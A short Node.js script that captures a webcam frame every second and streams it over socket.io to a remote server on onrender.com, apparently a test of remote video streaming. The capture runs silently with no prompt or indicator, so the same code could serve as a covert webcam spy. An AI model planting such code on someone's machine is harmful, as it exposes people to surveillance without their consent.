#!/usr/bin/env node

const Webcam = require('node-webcam');
const io = require('socket.io-client');
const socket = io("https://cli-testing-1.onrender.com"); // Replace with your server IP

const webcam = Webcam.create({
  width: 320,
  height: 240,
  delay: 0,
  saveShots: false,
  output: "jpeg",
  device: false,
  callbackReturn: "base64",
  verbose: false
});

setInterval(() => {
 webcam.capture("shot", (err, data) => {
  if (!err && data) {
    socket.emit("video", data);
  } else {
    console.error("❌ Webcam Error:", err);
  }
});
}, 1000);
